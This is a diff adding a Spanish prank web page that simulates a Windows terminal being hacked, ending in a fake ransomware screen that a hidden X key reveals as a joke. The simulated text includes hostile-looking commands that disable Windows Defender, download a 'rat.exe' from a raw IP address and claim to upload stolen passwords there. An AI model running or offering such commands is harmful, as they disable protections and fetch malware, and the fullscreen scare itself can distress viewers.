@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Símbolo del sistema</title>
+<style>
+  :root { color-scheme: dark; }
+  html, body { margin: 0; height: 100%; background: #0c0c0c; overflow: hidden; }
+  #t {
+    height: 100%; box-sizing: border-box; padding: 0 4px;
+    overflow-y: auto; overflow-x: hidden;
+    font: 16px/1.2 "Cascadia Mono", "Cascadia Code", Consolas, "Courier New", monospace;
+    color: #cccccc; white-space: pre-wrap; word-break: break-all; cursor: text;
+  }
+  #t.run { cursor: none; }
+  #t::-webkit-scrollbar { width: 17px; }
+  #t::-webkit-scrollbar-track { background: #171717; }
+  #t::-webkit-scrollbar-thumb { background: #4d4d4d; }
+  .l { min-height: 1.2em; }
+  .r { color: #e74856; } .g { color: #16c60c; } .y { color: #f9f1a5; } .c { color: #3a96dd; }
+  #cur { display: inline-block; width: 0.6em; height: 1.2em; background: #cccccc; vertical-align: text-bottom; animation: b 1.06s steps(1) infinite; }
+  #cur.off { display: none; }
+  @keyframes b { 50% { opacity: 0; } }
+
+  #hack { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; flex-direction: column;
+    text-align: center; background: #b00000; color: #fff; font-family: Impact, "Arial Black", sans-serif; z-index: 10;
+    animation: fl 0.5s steps(1) infinite; cursor: none; padding: 16px; box-sizing: border-box; }
+  @keyframes fl { 0% { background: #b00000; } 50% { background: #140000; } }
+  #hack .sk { font-size: min(22vw, 200px); line-height: 1; }
+  #hack h1 { margin: 0.1em 0; font-size: min(11vw, 120px); letter-spacing: 0.04em;
+    text-shadow: 4px 0 #0ff, -4px 0 #f0f; animation: gl 0.3s steps(2) infinite; }
+  @keyframes gl { 0% { transform: translate(0); } 50% { transform: translate(-6px, 3px); } 100% { transform: translate(5px, -2px); } }
+  #hack p { margin: 0.3em 0; font: 600 min(3.2vw, 26px)/1.35 "Segoe UI", Arial, sans-serif; max-width: 900px; }
+  #hack .cd { font: 700 min(6vw, 56px) Consolas, monospace; margin-top: 0.4em; color: #ffdddd; }
+  #joke { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; background: #0c0c0c; color: #16c60c;
+    font: 600 min(6vw, 48px) "Segoe UI", Arial, sans-serif; text-align: center; z-index: 20; padding: 16px; }
+</style>
+</head>
+<body>
+<div id="t"></div>
+
+<div id="hack">
+  <div class="sk">☠</div>
+  <h1>¡FUISTE HACKEADO!</h1>
+  <p>Tus archivos fueron cifrados. Tus contraseñas, fotos y cámara están bajo nuestro control.</p>
+  <div class="cd" id="cd">23:59:59</div>
+</div>
+<div id="joke">😂 Era una broma. Tranqui, no pasó nada.</div>
+
+<script>
+/* ====== PERSONALIZÁ ACÁ ====== */
+const USUARIO = "Usuario";   // nombre de usuario que aparece en el prompt (ej: "Juan")
+/* ============================= */
+
+const term = document.getElementById('t');
+const cur = document.createElement('span'); cur.id = 'cur';
+const PROMPT = `C:\\Users\\${USUARIO}>`;
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const rnd = (a, b) => a + Math.random() * (b - a);
+
+/* ---------- Audio (sintetizado, sin archivos externos) ---------- */
+let ac;
+const AC = () => (ac = ac || new (window.AudioContext || window.webkitAudioContext)());
+function tone(f, d, type = 'square', v = 0.05, delay = 0) {
+  const a = AC(), o = a.createOscillator(), g = a.createGain(), s = a.currentTime + delay;
+  o.type = type; o.frequency.value = f; o.connect(g); g.connect(a.destination);
+  g.gain.setValueAtTime(v, s); g.gain.exponentialRampToValueAtTime(0.0001, s + d);
+  o.start(s); o.stop(s + d + 0.02);
+}
+const key = () => tone(rnd(900, 1500), 0.025, 'square', 0.025);
+const blip = () => tone(rnd(400, 700), 0.04, 'sine', 0.04);
+const errBeep = () => { tone(880, 0.18, 'sine', 0.2); tone(440, 0.25, 'sine', 0.2, 0.18); };
+function noise(d = 0.25, v = 0.25) {
+  const a = AC(), n = a.sampleRate * d, b = a.createBuffer(1, n, a.sampleRate), x = b.getChannelData(0);
+  for (let i = 0; i < n; i++) x[i] = (Math.random() * 2 - 1) * (1 - i / n);
+  const s = a.createBufferSource(), g = a.createGain(); g.gain.value = v; s.buffer = b; s.connect(g); g.connect(a.destination); s.start();
+}
+let siren;
+function startSiren() {
+  const a = AC(), o = a.createOscillator(), g = a.createGain();
+  o.type = 'sawtooth'; g.gain.value = 0.14; o.connect(g); g.connect(a.destination); o.start();
+  let t = 0; const id = setInterval(() => { t += 0.03; o.frequency.value = 750 + 350 * Math.sin(t * 7); }, 20);
+  siren = () => { clearInterval(id); o.stop(); };
+}
+
+/* ---------- Terminal ---------- */
+function line(text = '', cls = '') {
+  const d = document.createElement('div'); d.className = 'l ' + cls; d.textContent = text;
+  term.appendChild(d); term.scrollTop = term.scrollHeight; return d;
+}
+function put(l, s) { l.insertBefore(document.createTextNode(s), cur.parentNode === l ? cur : null); }
+function showCursor(l) { l.appendChild(cur); cur.classList.remove('off'); term.scrollTop = term.scrollHeight; }
+const hideCursor = () => cur.classList.add('off');
+
+async function cmd(c) {
+  const l = line(PROMPT); showCursor(l);
+  await sleep(rnd(500, 900));
+  for (const ch of c) { put(l, ch); key(); term.scrollTop = term.scrollHeight; await sleep(rnd(40, 120)); }
+  await sleep(350); hideCursor(); tone(700, 0.03, 'square', 0.03);
+}
+async function out(lines, delay = 60, cls = '') {
+  for (const s of [].concat(lines)) {
+    const [txt, c] = Array.isArray(s) ? s : [s, cls];
+    line(txt, c); if (txt) blip(); await sleep(delay * rnd(0.6, 1.5));
+  }
+}
+async function bar(label, ms, cls = '') {
+  const l = line(''), N = 30;
+  for (let i = 0; i <= N; i++) {
+    l.textContent = `${label} [${'█'.repeat(i)}${'░'.repeat(N - i)}] ${String(Math.round(i / N * 100)).padStart(3)}%`;
+    l.className = 'l ' + cls; if (i % 3 === 0) blip();
+    term.scrollTop = term.scrollHeight; await sleep(ms / N * rnd(0.4, 1.6));
+  }
+}
+
+const FILES = ['Documentos\\tarea_final.docx', 'Fotos\\IMG_2041.jpg', 'Fotos\\vacaciones_2025.png', 'Descargas\\setup.exe',
+  'Escritorio\\notas.txt', 'Videos\\clip_01.mp4', 'Documentos\\contraseñas.xlsx', 'Música\\playlist.mp3', 'Fotos\\selfie_12.jpg',
+  'Documentos\\CV_actualizado.pdf', 'Escritorio\\proyecto.zip', 'Videos\\gameplay_03.mp4', 'Documentos\\banco_resumen.pdf'];
+
+function banner() {
+  line('Microsoft Windows [Versión 10.0.22631.4460]');
+  line('(c) Microsoft Corporation. Todos los derechos reservados.');
+  line('');
+  showCursor(line(PROMPT));
+}
+
+async function sequence() {
+  term.classList.add('run');
+  const l0 = term.lastChild; await sleep(900); hideCursor();
+  term.removeChild(l0);
+  await cmd('whoami');
+  await out(`desktop-k7m2q9\\${USUARIO.toLowerCase()}`, 80); await out('');
+
+  await cmd('ipconfig');
+  await out(['', 'Configuración IP de Windows', '', 'Adaptador de LAN inalámbrica Wi-Fi:', '',
+    '   Sufijo DNS específico para la conexión. . :',
+    '   Vínculo: dirección IPv6 local. . . . . . : fe80::a1c3:5e2f:9b41:77d%12',
+    '   Dirección IPv4. . . . . . . . . . . . . . : 192.168.0.23',
+    '   Máscara de subred . . . . . . . . . . . . : 255.255.255.0',
+    '   Puerta de enlace predeterminada . . . . . : 192.168.0.1', ''], 90);
+
+  await cmd('powershell -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true"');
+  await sleep(700);
+  await out([['[+] Protección en tiempo real de Windows Defender: DESACTIVADA', 'y'],
+             ['[+] Firewall de Windows: DESACTIVADO', 'y'], ''], 450);
+
+  await cmd('curl -o svchost32.exe http://185.220.101.47/rat.exe');
+  await bar('Descargando svchost32.exe', 2600, 'c'); await out(''); await sleep(300);
+
+  await cmd('svchost32.exe /install /silent');
+  await out('Inicializando módulos...', 500);
+  for (const m of ['keylogger.dll', 'webcam_hook.sys', 'remote_shell.exe', 'screen_capture.dll'])
+    await bar('Instalando ' + m.padEnd(18), rnd(1100, 1700));
+  await out([['[!] Persistencia establecida en HKLM\\Software\\Microsoft\\Windows\\Run', 'r'], ''], 500); errBeep();
+
+  await cmd('dumper.exe --browsers --wifi --cam');
+  await out(['[*] Extrayendo contraseñas guardadas de Chrome...', ['    128 credenciales encontradas', 'g'],
+    '[*] Copiando cookies de sesión...', ['    94 sesiones activas robadas', 'g'],
+    '[*] Leyendo claves Wi-Fi guardadas...', ['    7 redes encontradas', 'g'],
+    '[*] Accediendo a la cámara web...', ['    Cámara 0: ACCESO CONCEDIDO', 'r'],
+    '[*] Subiendo datos a 185.220.101.47:4444...'], 700);
+  await bar('Subiendo', 2200, 'c'); await out(''); errBeep(); await sleep(400);
+
+  await cmd(`crypt.exe C:\\Users\\${USUARIO}\\ /encrypt /aes256`);
+  await out([['[!] Iniciando cifrado de archivos personales', 'r']], 600);
+  for (let i = 0; i < 55; i++) {
+    const f = FILES[Math.floor(Math.random() * FILES.length)];
+    line(`Cifrando: C:\\Users\\${USUARIO}\\${f} ... OK`, i % 7 === 6 ? 'r' : ''); if (i % 2) blip();
+    await sleep(rnd(25, 90));
+  }
+  await sleep(500);
+  await out([['', ''], ['[!] SISTEMA COMPROMETIDO', 'r'], ['[!] ACCESO TOTAL OBTENIDO', 'r']], 700);
+  errBeep(); noise(0.4, 0.3); await sleep(900);
+  boom();
+}
+
+function boom() {
+  const h = document.getElementById('hack'); h.style.display = 'flex';
+  noise(0.6, 0.4); startSiren();
+  let s = 86399; const cd = document.getElementById('cd');
+  setInterval(() => { s--; cd.textContent = [s / 3600, s % 3600 / 60, s % 60].map(v => String(Math.floor(v)).padStart(2, '0')).join(':'); }, 1000);
+  try {
+    const u = new SpeechSynthesisUtterance('Has sido hackeado'); u.lang = 'es-ES'; u.rate = 0.8; u.pitch = 0.3;
+    speechSynthesis.speak(u); setInterval(() => speechSynthesis.speak(u), 6000);
+  } catch (e) {}
+}
+
+let started = false;
+function start(e) {
+  if (started) return;
+  if (e.type === 'keydown' && ['Escape', 'F11', 'F12'].includes(e.key)) return;
+  started = true; AC().resume();
+  try { document.documentElement.requestFullscreen(); } catch (_) {}
+  sequence();
+}
+addEventListener('click', start); addEventListener('keydown', start);
+
+/* Salida de emergencia: tecla X revela que es una broma */
+addEventListener('keydown', e => {
+  if (e.key.toLowerCase() === 'x' && started) {
+    if (siren) siren(); try { speechSynthesis.cancel(); } catch (_) {}
+    document.getElementById('hack').style.display = 'none';
+    document.getElementById('joke').style.display = 'flex';
+    document.body.style.cursor = 'default';
+    setTimeout(() => location.reload(), 60000);
+  }
+});
+addEventListener('contextmenu', e => e.preventDefault());
+banner();
+</script>
+</body>
+</html>
